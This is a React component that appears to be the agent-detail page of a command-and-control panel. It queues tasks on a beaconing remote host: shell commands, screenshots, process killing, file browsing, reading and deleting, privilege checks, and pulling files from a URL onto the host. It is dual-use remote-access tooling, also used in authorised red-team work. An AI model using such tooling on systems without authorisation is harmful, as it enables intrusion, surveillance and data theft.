import React, { useState, useEffect, useRef, useCallback } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { 
  Terminal as TerminalIcon, 
  Cpu, 
  Globe, 
  Clock, 
  ChevronLeft, 
  Send,
  Loader2,
  CheckCircle2,
  AlertCircle,
  FileText,
  Activity,
  Trash2,
  Zap,
  Folder,
  ChevronRight,
  HardDrive,
  Wifi,
  RefreshCw,
  ArrowDown,
  MousePointer2,
  Monitor,
  ShieldCheck
} from 'lucide-react';
import { agentsApi, tasksApi } from '../utils/api';
import { format } from 'date-fns';

const AgentDetailPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [command, setCommand] = useState('');
  const [executing, setExecuting] = useState(false);
  const [activeTab, setActiveTab] = useState('console'); // 'console', 'processes', 'files', 'network'
  const [pendingTasks, setPendingTasks] = useState([]);
  const [autoScroll, setAutoScroll] = useState(true);
  const resultEndRef = useRef(null);

  const fetchDetails = useCallback(async () => {
    try {
      const details = await agentsApi.get(id);
      setData(details);
      
      // Clean up pending tasks that are now in results
      if (details.results) {
        setPendingTasks(prev => prev.filter(pt => 
          !details.results.some(r => Number(r.task_id) === Number(pt.id))
        ));
      }
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  }, [id]);

  useEffect(() => {
    let isMounted = true;
    
    const init = async () => {
      if (isMounted) {
        await fetchDetails();
      }
    };

    init();
    const interval = setInterval(fetchDetails, 3000); // Faster refresh for better UX
    
    return () => {
      isMounted = false;
      clearInterval(interval);
    };
  }, [fetchDetails]);

  const lastResultsLength = useRef(0);

  useEffect(() => {
    const newLength = (data?.results?.length || 0) + pendingTasks.length;
    if (newLength > lastResultsLength.current) {
      if (autoScroll && activeTab === 'console') {
        resultEndRef.current?.scrollIntoView({ behavior: 'smooth' });
      }
      lastResultsLength.current = newLength;
    }
  }, [data?.results, pendingTasks, autoScroll, activeTab]);

  const handleQuickAction = async (type, payload) => {
    try {
      const result = await tasksApi.create(id, type, payload);
      // Add to pending for immediate feedback
      setPendingTasks(prev => [...prev, {
        id: result.id,
        task_type: type,
        task_payload: JSON.stringify(payload),
        status: 'pending',
        created_at: new Date().toISOString()
      }]);
      return result;
    } catch (err) {
      alert(err.message);
    }
  };

  const handleKillAgent = async () => {
    if (window.confirm('Are you sure you want to terminate this agent? It will no longer respond to beacons.')) {
      try {
        await agentsApi.kill(id);
        navigate('/agents');
      } catch (err) {
        alert(err.message);
      }
    }
  };

  const handleRunCommand = async (e) => {
    e.preventDefault();
    if (!command.trim() || executing) return;

    setExecuting(true);
    await handleQuickAction('execute_command', { command });
    setCommand('');
    setExecuting(false);
  };

  const renderOutput = (res) => {
    if (res.output && res.output.startsWith('SCREENSHOT:')) {
      const dataUri = res.output.replace('SCREENSHOT:', '');
      return (
        <div className="space-y-2">
          <div className="text-slate-400 text-xs italic italic">Screenshot captured</div>
          <img 
            src={dataUri} 
            alt="Screenshot" 
            className="rounded-lg border border-slate-800 max-w-full hover:scale-105 transition-transform cursor-zoom-in" 
            onClick={() => window.open(dataUri)}
          />
        </div>
      );
    }

    return (
      <pre className="whitespace-pre-wrap text-slate-300 bg-slate-900/50 p-3 rounded-lg border border-slate-800 overflow-x-auto font-mono">
        {res.output || (res.error ? `ERROR: ${res.error}` : 'No output')}
      </pre>
    );
  };

  if (loading && !data) {
    return (
      <div className="h-full flex items-center justify-center">
        <Loader2 className="w-8 h-8 text-primary animate-spin" />
      </div>
    );
  }

  const { agent, results } = data;

  const getLatestPsResult = () => {
    const psRes = [...results].reverse().find(r => r.task_type === 'ps_json' && r.status === 'success');
    if (!psRes) return null;
    try {
      return JSON.parse(psRes.output);
    } catch {
      return null;
    }
  };

  const getLatestLsResult = () => {
    const lsRes = [...results].reverse().find(r => r.task_type === 'ls_json' && r.status === 'success');
    if (!lsRes) return null;
    try {
      return JSON.parse(lsRes.output);
    } catch {
      return null;
    }
  };

  const getLatestNetstatResult = () => {
    const netRes = [...results].reverse().find(r => r.task_type === 'netstat_json' && r.status === 'success');
    if (!netRes) return null;
    try {
      return JSON.parse(netRes.output);
    } catch {
      return null;
    }
  };

  const formatFileSize = (bytes) => {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  };

  return (
    <div className="flex flex-col h-full overflow-hidden">
      {/* Fixed Page Header & Tabs */}
      <div className="shrink-0 space-y-6 pb-6">
        <div className="flex items-center justify-between gap-4">
          <div className="flex items-center gap-4">
            <button 
              onClick={() => navigate(-1)}
              className="p-1.5 rounded-lg hover:bg-white/5 text-slate-500 hover:text-white transition-colors"
            >
              <ChevronLeft className="w-5 h-5" />
            </button>
            <div>
              <div className="flex items-center gap-3 mb-0.5">
                <h1 className="text-xl font-bold tracking-tight text-white">{agent.hostname}</h1>
                <span className={`px-2 py-0.5 rounded-full text-[9px] font-black uppercase tracking-widest ${
                  agent.connection_status === 'online' ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20' : 'bg-slate-800/50 text-slate-500 border border-slate-700'
                }`}>
                  {agent.connection_status}
                </span>
              </div>
              <p className="text-[9px] text-slate-600 font-mono tracking-widest uppercase">{agent.id}</p>
            </div>
          </div>
          
          <div className="flex gap-2">
            <button 
              onClick={() => handleQuickAction('system_info', {})}
              className="px-3 py-1.5 rounded-lg bg-slate-900 border border-slate-800 hover:bg-slate-800 text-slate-400 text-[10px] font-bold uppercase tracking-wider transition-all flex items-center gap-2"
            >
              <RefreshCw className="w-3 h-3" />
              Refresh
            </button>
            <button 
              onClick={handleKillAgent}
              className="px-3 py-1.5 rounded-lg bg-red-500/5 border border-red-500/10 hover:bg-red-500/20 text-red-500/70 hover:text-red-400 text-[10px] font-bold uppercase tracking-wider transition-all flex items-center gap-2"
            >
              <Trash2 className="w-3 h-3" />
              Kill
            </button>
          </div>
        </div>

        <div className="flex border-b border-slate-900 gap-6">
          {['console', 'processes', 'files', 'network'].map((tab) => (
            <button 
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`pb-3 text-[10px] font-black uppercase tracking-[0.15em] transition-all border-b-2 ${
                activeTab === tab 
                  ? 'text-primary border-primary' 
                  : 'text-slate-600 border-transparent hover:text-slate-300'
              }`}
            >
              {tab === 'console' ? 'Console' : tab === 'processes' ? 'Processes' : tab === 'files' ? 'Explorer' : 'Network'}
            </button>
          ))}
        </div>
      </div>

      {/* Main Multi-Pane Grid */}
      <div className="flex-1 grid grid-cols-1 lg:grid-cols-4 gap-6 min-h-0 overflow-hidden">
        {/* Left Sidebar: Scrolls independently */}
        <div className="lg:col-span-1 space-y-6 overflow-y-auto scrollbar-none pb-6">
          {/* System Info */}
          <div className="card p-5 space-y-4">
            <h3 className="text-sm font-bold flex items-center gap-2 text-white">
              <Activity className="w-4 h-4 text-primary" />
              System Meta
            </h3>
            <div className="space-y-1">
              <div className="flex items-center justify-between py-1.5">
                <span className="text-slate-500 text-[11px] font-bold uppercase tracking-wider">OS</span>
                <span className="text-white font-mono text-xs">{agent.os}</span>
              </div>
              <div className="flex items-center justify-between py-1.5">
                <span className="text-slate-500 text-[11px] font-bold uppercase tracking-wider">Arch</span>
                <span className="text-white font-mono text-xs">{agent.arch}</span>
              </div>
              <div className="flex items-center justify-between py-1.5">
                <span className="text-slate-500 text-[11px] font-bold uppercase tracking-wider">PID</span>
                <span className="text-white font-mono text-xs">{agent.pid}</span>
              </div>
            </div>
            <div className="pt-3 border-t border-slate-800">
              <p className="text-slate-500 text-[9px] uppercase tracking-[0.2em] font-bold mb-2">Endpoint IP</p>
              <div className="bg-black/20 p-2 rounded border border-slate-800 text-[10px] font-mono text-primary">
                {agent.ip_address}
              </div>
            </div>
          </div>

          {/* Quick Actions / Modules */}
          <div className="card p-5 space-y-4">
            <h3 className="text-sm font-bold flex items-center gap-2 text-white">
              <Zap className="w-4 h-4 text-amber-400" />
              Quick Actions
            </h3>
            <div className="grid grid-cols-3 gap-2">
              <button 
                onClick={() => handleQuickAction('screenshot', {})}
                className="flex flex-col items-center justify-center p-2 rounded-lg bg-slate-900/50 border border-slate-800 hover:border-primary/50 hover:bg-primary/5 transition-all group"
                title="Capture screen"
              >
                <Monitor className="w-4 h-4 mb-1 text-slate-500 group-hover:text-primary" />
                <span className="text-[9px] font-bold uppercase tracking-tighter text-slate-500 group-hover:text-white">Cap</span>
              </button>
              <button 
                onClick={() => handleQuickAction('ps_json', {})}
                className="flex flex-col items-center justify-center p-2 rounded-lg bg-slate-900/50 border border-slate-800 hover:border-primary/50 hover:bg-primary/5 transition-all group"
                title="List processes"
              >
                <Cpu className="w-4 h-4 mb-1 text-slate-500 group-hover:text-primary" />
                <span className="text-[9px] font-bold uppercase tracking-tighter text-slate-500 group-hover:text-white">Proc</span>
              </button>
              <button 
                onClick={() => handleQuickAction('ls_json', { path: '.' })}
                className="flex flex-col items-center justify-center p-2 rounded-lg bg-slate-900/50 border border-slate-800 hover:border-primary/50 hover:bg-primary/5 transition-all group"
                title="Browse files"
              >
                <Folder className="w-4 h-4 mb-1 text-slate-500 group-hover:text-primary" />
                <span className="text-[9px] font-bold uppercase tracking-tighter text-slate-500 group-hover:text-white">Files</span>
              </button>
              <button 
                onClick={() => handleQuickAction('netstat_json', {})}
                className="flex flex-col items-center justify-center p-2 rounded-lg bg-slate-900/50 border border-slate-800 hover:border-primary/50 hover:bg-primary/5 transition-all group"
                title="Network status"
              >
                <Wifi className="w-4 h-4 mb-1 text-slate-500 group-hover:text-primary" />
                <span className="text-[9px] font-bold uppercase tracking-tighter text-slate-500 group-hover:text-white">Net</span>
              </button>
              <button 
                onClick={() => handleQuickAction('getprivs', {})}
                className="flex flex-col items-center justify-center p-2 rounded-lg bg-slate-900/50 border border-slate-800 hover:border-primary/50 hover:bg-primary/5 transition-all group"
                title="Check privileges"
              >
                <Activity className="w-4 h-4 mb-1 text-slate-500 group-hover:text-primary" />
                <span className="text-[9px] font-bold uppercase tracking-tighter text-slate-500 group-hover:text-white">Privs</span>
              </button>
              <button 
                onClick={() => {
                  const url = prompt('Enter URL to download from:');
                  const path = prompt('Enter local destination path:');
                  if(url && path) handleQuickAction('download_url', { url, path })
                }}
                className="flex flex-col items-center justify-center p-2 rounded-lg bg-slate-900/50 border border-slate-800 hover:border-primary/50 hover:bg-primary/5 transition-all group"
                title="Download file"
              >
                <ArrowDown className="w-4 h-4 mb-1 text-slate-500 group-hover:text-primary" />
                <span className="text-[9px] font-bold uppercase tracking-tighter text-slate-500 group-hover:text-white">Pull</span>
              </button>
            </div>
          </div>

            <div className="card p-6 bg-slate-900/30">
              <h3 className="text-sm font-bold uppercase tracking-widest text-slate-400 mb-6 flex items-center gap-2">
                <Activity className="w-4 h-4 text-blue-400" />
                System Meta
              </h3>
              <div className="space-y-4">
                <MetaRow icon={<Monitor className="w-4 h-4" />} label="OS" value={agent.os} />
                <MetaRow icon={<Cpu className="w-4 h-4" />} label="Arch" value={agent.arch} />
                <MetaRow icon={<TerminalIcon className="w-4 h-4" />} label="PID" value={agent.pid} />
                <MetaRow icon={<HardDrive className="w-4 h-4" />} label="Drive" value={`${agent.os === 'windows' ? 'C:' : '/'}`} />
              </div>

            </div>
            
            <div className="mt-8 pt-8 border-t border-slate-800/50">
              <h3 className="text-xs font-bold uppercase tracking-widest text-slate-500 mb-4">Environment</h3>
              <div className="bg-black/40 rounded-xl p-4 font-mono text-[10px] text-slate-400 leading-relaxed">
                USER: {agent.username}<br/>
                HOST: {agent.hostname}<br/>
                IP: {agent.ip_address}
              </div>
            </div>

            <div className="card p-6 border-blue-500/20 bg-blue-500/5">
              <h3 className="text-[10px] font-bold uppercase tracking-[0.2em] text-blue-400 mb-4">Active Modules</h3>
              <div className="space-y-2">
                {['PS_JSON', 'LS_JSON', 'NET_MAP', 'SCREEN'].map(mod => (
                  <div key={mod} className="flex items-center justify-between text-[10px] font-bold">
                    <span className="text-slate-500">{mod}</span>
                    <span className="text-success">LOADED</span>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Middle Column: Interaction Area (Scrolls independently) */}
          <div className="lg:col-span-3 flex flex-col overflow-hidden">
            {activeTab === 'console' && (
            <div className="card flex-1 flex flex-col overflow-hidden relative border-slate-800/50">
              <div className="p-5 border-b border-slate-800 flex items-center justify-between bg-slate-900/40 shrink-0">
                <div className="flex items-center gap-3">
                  <div className="p-2 bg-primary/10 rounded-lg border border-primary/20">
                    <TerminalIcon className="w-4 h-4 text-primary" />
                  </div>
                  <span className="text-sm font-bold text-white">Live Session</span>
                </div>
                <div className="flex items-center gap-6">
                  <label className="flex items-center gap-2 cursor-pointer group">
                    <input 
                      type="checkbox" 
                      checked={autoScroll} 
                      onChange={(e) => setAutoScroll(e.target.checked)}
                      className="hidden"
                    />
                    <div className={`w-8 h-4 rounded-full transition-all relative ${autoScroll ? 'bg-primary' : 'bg-slate-700'}`}>
                      <div className={`absolute top-1 w-2 h-2 bg-white rounded-full transition-all ${autoScroll ? 'left-5' : 'left-1'}`} />
                    </div>
                    <span className="text-xs text-slate-500 uppercase font-bold group-hover:text-slate-300">Auto-Scroll</span>
                  </label>
                  <div className="h-4 w-px bg-slate-800 mx-2" />
                  <div className="flex items-center gap-2 text-xs font-bold text-slate-500 uppercase tracking-wider">
                    <span className="w-2 h-2 rounded-full bg-success animate-pulse" />
                    {agent.beacon_interval}s interval
                  </div>
                </div>
              </div>
              
              <div className="flex-1 overflow-y-auto p-6 space-y-6 font-mono text-sm bg-black/30 scrollbar-thin scroll-smooth">
                {results.length === 0 && pendingTasks.length === 0 ? (
                  <div className="h-full flex flex-col items-center justify-center text-slate-600 opacity-20 select-none">
                    <TerminalIcon className="w-16 h-16 mb-4" />
                    <p className="text-xs uppercase tracking-[0.4em] font-bold">Awaiting Input</p>
                  </div>
                ) : (
                  [...results, ...pendingTasks].sort((a, b) => new Date(a.created_at) - new Date(b.created_at)).map((res) => {
                    const payload = JSON.parse(res.task_payload);
                    const isPending = res.status === 'pending';
                    
                    return (
                      <div key={res.id} className={`group animate-in fade-in duration-500 ${isPending ? 'opacity-40 grayscale scale-[0.99] origin-left' : ''}`}>
                        <div className="flex items-center gap-3 text-slate-500 mb-2">
                          <span className="text-[10px] bg-slate-800/80 px-2 py-0.5 rounded text-slate-400 font-bold tracking-tighter">
                            {res.task_type.toUpperCase()}
                          </span>
                          <span className="text-[10px] opacity-50">{format(new Date(res.created_at), 'HH:mm:ss')}</span>
                          {isPending ? (
                            <Loader2 className="w-3 h-3 animate-spin text-primary" />
                          ) : res.status === 'success' ? (
                            <CheckCircle2 className="w-3 h-3 text-success/70" />
                          ) : (
                            <AlertCircle className="w-3 h-3 text-error/70" />
                          )}
                        </div>
                        <div className="pl-6 border-l-2 border-slate-800/50 group-hover:border-primary/30 transition-colors">
                          <div className="text-white/90 mb-3 flex items-center gap-2">
                            <span className="text-primary/60 font-bold">$</span>
                            <span className="font-bold tracking-tight">{payload.command || res.task_type}</span>
                            {payload.path && <span className="text-slate-600 ml-2">[{payload.path}]</span>}
                          </div>
                          {!isPending && (
                            <div className="bg-black/20 rounded-xl p-4 border border-white/5 shadow-inner">
                              {renderOutput(res)}
                            </div>
                          )}
                        </div>
                      </div>
                    );
                  })
                )}
                <div ref={resultEndRef} />
              </div>

              {!autoScroll && (
                <button 
                  onClick={() => { setAutoScroll(true); resultEndRef.current?.scrollIntoView({ behavior: 'smooth' }); }}
                  className="absolute bottom-28 right-8 p-4 rounded-2xl bg-primary text-white shadow-2xl shadow-primary/40 animate-in zoom-in-50 duration-300 hover:scale-110 active:scale-95 transition-all z-20"
                >
                  <ArrowDown className="w-5 h-5" />
                </button>
              )}

              <form onSubmit={handleRunCommand} className="p-6 bg-slate-900/50 border-t border-slate-800 shrink-0">
                <div className="relative group">
                  <div className="absolute inset-y-0 left-5 flex items-center pointer-events-none">
                    <span className="text-primary font-bold text-lg">$</span>
                  </div>
                  <input
                    type="text"
                    value={command}
                    onChange={(e) => setCommand(e.target.value)}
                    placeholder="Enter system command..."
                    className="w-full bg-slate-950/50 border-2 border-slate-800 rounded-2xl pl-12 pr-32 py-4 text-white outline-none focus:border-primary/50 focus:bg-slate-950 transition-all font-mono text-base placeholder:text-slate-700"
                    disabled={executing}
                  />
                  <div className="absolute right-3 inset-y-2">
                    <button
                      type="submit"
                      disabled={executing || !command.trim()}
                      className="h-full px-6 btn-primary rounded-xl font-bold uppercase text-xs tracking-widest disabled:opacity-30 transition-all flex items-center gap-2"
                    >
                      {executing ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
                      Run
                    </button>
                  </div>
                </div>
              </form>
            </div>
          )}

          {activeTab === 'processes' && (
            <div className="card flex-1 flex flex-col overflow-hidden relative">
              <div className="p-5 border-b border-slate-800 flex items-center justify-between bg-slate-900/40 shrink-0">
                <div className="flex items-center gap-3">
                  <div className="p-2 bg-primary/10 rounded-lg border border-primary/20">
                    <Cpu className="w-4 h-4 text-primary" />
                  </div>
                  <span className="text-sm font-bold text-white">Process Manager</span>
                </div>
                <button 
                  onClick={() => handleQuickAction('ps_json', {})}
                  disabled={pendingTasks.some(t => t.task_type === 'ps_json')}
                  className="btn btn-primary text-xs px-4 rounded-lg"
                >
                  {pendingTasks.some(t => t.task_type === 'ps_json') ? (
                    <><RefreshCw className="w-4 h-4 animate-spin" /> Scanning</>
                  ) : (
                    <><RefreshCw className="w-4 h-4" /> Refresh</>
                  )}
                </button>
              </div>
              
              <div className={`flex-1 overflow-y-auto scrollbar-thin transition-opacity duration-500 ${pendingTasks.some(t => t.task_type === 'ps_json') ? 'opacity-30 pointer-events-none' : 'opacity-100'}`}>
                <table className="w-full text-left text-sm border-collapse">
                  <thead className="bg-slate-900/50 text-slate-500 sticky top-0 z-10">
                    <tr>
                      <th className="p-5 border-b border-slate-800 font-bold uppercase text-xs tracking-wider">PID</th>
                      <th className="p-5 border-b border-slate-800 font-bold uppercase text-xs tracking-wider">Process Name</th>
                      <th className="p-5 border-b border-slate-800 font-bold uppercase text-xs tracking-wider">Threads</th>
                      <th className="p-5 border-b border-slate-800 font-bold uppercase text-xs tracking-wider text-right">Action</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/50">
                    {getLatestPsResult() ? (
                      getLatestPsResult().sort((a, b) => a.pid - b.pid).map((proc) => (
                        <tr key={proc.pid} className="hover:bg-primary/5 transition-colors group">
                          <td className="p-5 font-mono text-primary text-sm font-semibold">{proc.pid}</td>
                          <td className="p-5 font-medium text-slate-200">{proc.name}</td>
                          <td className="p-5 text-slate-500 font-mono text-sm">{proc.threads || '-'}</td>
                          <td className="p-5 text-right">
                            <button 
                              onClick={() => {
                                if(confirm(`Kill process ${proc.name} (${proc.pid})?`)) {
                                  handleQuickAction('kill', { pid: proc.pid });
                                }
                              }}
                              className="p-2.5 rounded-lg hover:bg-error/20 text-slate-600 hover:text-error transition-all"
                              title="Kill process"
                            >
                              <Trash2 className="w-4 h-4" />
                            </button>
                          </td>
                        </tr>
                      ))
                    ) : (
                      <tr>
                        <td colSpan="4" className="p-20 text-center text-slate-600 italic uppercase tracking-wider font-bold text-sm">
                          No Process Data Available
                        </td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {activeTab === 'files' && (
            <div className="card flex-1 flex flex-col overflow-hidden relative">
              <div className="p-5 border-b border-slate-800 flex items-center justify-between bg-slate-900/40 shrink-0">
                <div className="flex items-center gap-3">
                  <div className="p-2 bg-primary/10 rounded-lg border border-primary/20">
                    <Folder className="w-4 h-4 text-primary" />
                  </div>
                  <span className="text-sm font-bold text-white">File Browser</span>
                </div>
                <div className="flex gap-2">
                  <button 
                    onClick={() => handleQuickAction('ls_json', { path: getLatestLsResult()?.path || '.' })}
                    disabled={pendingTasks.some(t => t.task_type === 'ls_json')}
                    className="btn btn-secondary text-xs px-3 rounded-lg"
                  >
                    {pendingTasks.some(t => t.task_type === 'ls_json') ? (
                      <RefreshCw className="w-4 h-4 animate-spin" />
                    ) : <RefreshCw className="w-4 h-4" />}
                  </button>
                  <button 
                    onClick={() => {
                      const path = prompt('Enter path to browse:');
                      if(path) handleQuickAction('ls_json', { path });
                    }}
                    className="btn btn-primary text-xs px-4 rounded-lg"
                  >
                    Go to Path
                  </button>
                </div>
              </div>

              {/* Breadcrumbs */}
              <div className="px-6 py-3 bg-slate-900/30 border-b border-slate-800 flex items-center gap-3 overflow-x-auto text-xs font-bold tracking-wider uppercase shrink-0 scrollbar-none">
                <HardDrive className="w-4 h-4 text-slate-600 flex-shrink-0" />
                {getLatestLsResult()?.path ? (
                  getLatestLsResult().path.replace(/\\/g, '/').split('/').filter(Boolean).map((part, idx, arr) => (
                    <React.Fragment key={idx}>
                      <button 
                        onClick={() => {
                          const targetPath = getLatestLsResult().path.replace(/\\/g, '/').split('/').slice(0, idx + 1).join('/') || '/';
                          handleQuickAction('ls_json', { path: targetPath });
                        }}
                        className="text-slate-500 hover:text-primary transition-colors whitespace-nowrap"
                      >
                        {part}
                      </button>
                      {idx < arr.length - 1 && <ChevronRight className="w-3 h-3 text-slate-800" />}
                    </React.Fragment>
                  ))
                ) : (
                  <span className="text-slate-700 italic">No Path Context</span>
                )}
              </div>
              
              <div className={`flex-1 overflow-y-auto scrollbar-thin transition-opacity duration-500 ${pendingTasks.some(t => t.task_type === 'ls_json') ? 'opacity-30 pointer-events-none' : 'opacity-100'}`}>
                <table className="w-full text-left text-sm border-collapse">
                  <thead className="bg-slate-900/50 text-slate-500 sticky top-0 z-10">
                    <tr>
                      <th className="p-5 border-b border-slate-800 font-bold uppercase text-xs tracking-wider w-12 text-center">Type</th>
                      <th className="p-5 border-b border-slate-800 font-bold uppercase text-xs tracking-wider">Name</th>
                      <th className="p-5 border-b border-slate-800 font-bold uppercase text-xs tracking-wider">Size</th>
                      <th className="p-5 border-b border-slate-800 font-bold uppercase text-xs tracking-wider text-right">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/50">
                    {getLatestLsResult() ? (
                      [...getLatestLsResult().files].sort((a, b) => {
                        if (a.is_dir && !b.is_dir) return -1;
                        if (!a.is_dir && b.is_dir) return 1;
                        return a.name.localeCompare(b.name);
                      }).map((file) => (
                        <tr 
                          key={file.name} 
                          className="hover:bg-primary/5 transition-colors group cursor-pointer"
                          onDoubleClick={() => {
                            if (file.is_dir) {
                              const separator = getLatestLsResult().path.includes('\\') ? '\\' : '/';
                              handleQuickAction('ls_json', { path: `${getLatestLsResult().path}${separator}${file.name}` });
                            }
                          }}
                        >
                          <td className="p-5 text-center">
                            {file.is_dir ? (
                              <Folder className="w-5 h-5 text-amber-500/70" />
                            ) : (
                              <FileText className="w-5 h-5 text-slate-600" />
                            )}
                          </td>
                          <td className="p-5">
                            <div className="font-semibold text-slate-200 group-hover:text-primary transition-colors">
                              {file.name}
                            </div>
                            <div className="text-xs text-slate-600 font-mono uppercase mt-1 tracking-tight">{file.mode}</div>
                          </td>
                          <td className="p-5 text-slate-500 font-mono text-sm">
                            {file.is_dir ? '—' : formatFileSize(file.size)}
                          </td>
                          <td className="p-5 text-right">
                            <div className="flex justify-end gap-2">
                              {!file.is_dir && (
                                <button 
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    const separator = getLatestLsResult().path.includes('\\') ? '\\' : '/';
                                    handleQuickAction('cat', { path: `${getLatestLsResult().path}${separator}${file.name}` });
                                    setActiveTab('console');
                                  }}
                                  className="p-2.5 rounded-lg hover:bg-primary/20 text-slate-600 hover:text-primary transition-all"
                                  title="View file"
                                >
                                  <FileText className="w-4 h-4" />
                                </button>
                              )}
                              <button 
                                onClick={(e) => {
                                  e.stopPropagation();
                                  if(confirm(`Delete ${file.name}?`)) {
                                    const separator = getLatestLsResult().path.includes('\\') ? '\\' : '/';
                                    handleQuickAction('rm', { path: `${getLatestLsResult().path}${separator}${file.name}` });
                                  }
                                }}
                                className="p-2.5 rounded-lg hover:bg-error/20 text-slate-600 hover:text-error transition-all"
                                title="Delete file"
                              >
                                <Trash2 className="w-4 h-4" />
                              </button>
                            </div>
                          </td>
                        </tr>
                      ))
                    ) : (
                      <tr>
                        <td colSpan="4" className="p-20 text-center text-slate-600 italic uppercase tracking-wider font-bold text-sm">
                          No Files Available
                        </td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {activeTab === 'network' && (
            <div className="card flex-1 flex flex-col overflow-hidden relative">
              <div className="p-5 border-b border-slate-800 flex items-center justify-between bg-slate-900/40 shrink-0">
                <div className="flex items-center gap-3">
                  <div className="p-2 bg-primary/10 rounded-lg border border-primary/20">
                    <Wifi className="w-4 h-4 text-primary" />
                  </div>
                  <span className="text-sm font-bold text-white">Network Connections</span>
                </div>
                <button 
                  onClick={() => handleQuickAction('netstat_json', {})}
                  disabled={pendingTasks.some(t => t.task_type === 'netstat_json')}
                  className="btn btn-primary text-xs px-4 rounded-lg"
                >
                  {pendingTasks.some(t => t.task_type === 'netstat_json') ? (
                    <><RefreshCw className="w-4 h-4 animate-spin" /> Scanning</>
                  ) : (
                    <><Wifi className="w-4 h-4" /> Refresh</>
                  )}
                </button>
              </div>
              
              <div className={`flex-1 overflow-y-auto scrollbar-thin transition-opacity duration-500 ${pendingTasks.some(t => t.task_type === 'netstat_json') ? 'opacity-30 pointer-events-none' : 'opacity-100'}`}>
                <table className="w-full text-left text-sm border-collapse">
                  <thead className="bg-slate-900/50 text-slate-500 sticky top-0 z-10">
                    <tr>
                      <th className="p-5 border-b border-slate-800 font-bold uppercase text-xs tracking-wider">Protocol</th>
                      <th className="p-5 border-b border-slate-800 font-bold uppercase text-xs tracking-wider">Local Address</th>
                      <th className="p-5 border-b border-slate-800 font-bold uppercase text-xs tracking-wider">Remote Address</th>
                      <th className="p-5 border-b border-slate-800 font-bold uppercase text-xs tracking-wider">State</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/50">
                    {getLatestNetstatResult() ? (
                      getLatestNetstatResult().map((conn, idx) => (
                        <tr key={idx} className="hover:bg-primary/5 transition-colors group">
                          <td className="p-5">
                            <span className={`px-2.5 py-1 rounded text-xs font-bold ${
                              conn.proto === 'TCP' ? 'bg-primary/10 text-primary' : 'bg-purple-500/10 text-purple-400'
                            }`}>
                              {conn.proto}
                            </span>
                          </td>
                          <td className="p-5 font-mono text-sm text-slate-400">{conn.local}</td>
                          <td className="p-5 font-mono text-sm text-slate-400">
                            {conn.remote === '0.0.0.0:0' || conn.remote === '*:*' ? (
                              <span className="text-slate-700 italic text-xs uppercase font-semibold tracking-tight">Listening</span>
                            ) : (
                              <span className={conn.state === 'ESTABLISHED' ? 'text-primary font-semibold' : 'text-slate-500'}>
                                {conn.remote}
                              </span>
                            )}
                          </td>
                          <td className="p-5">
                            <span className={`text-xs font-bold uppercase tracking-tight ${
                              conn.state === 'ESTABLISHED' ? 'text-success' : 
                              conn.state === 'LISTENING' ? 'text-amber-500/70' : 'text-slate-600'
                            }`}>
                              {conn.state}
                            </span>
                          </td>
                        </tr>
                      ))
                    ) : (
                      <tr>
                        <td colSpan="4" className="p-20 text-center text-slate-600 italic uppercase tracking-wider font-bold text-sm">
                          No Network Data
                        </td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

const MetaRow = ({ icon, label, value }) => (
  <div className="flex items-center justify-between group">
    <div className="flex items-center gap-3 text-slate-500 group-hover:text-slate-300 transition-colors">
      {icon}
      <span className="text-[10px] font-bold uppercase tracking-widest">{label}</span>
    </div>
    <span className="text-xs font-bold text-white group-hover:text-primary transition-colors">{value}</span>
  </div>
);

export default AgentDetailPage;
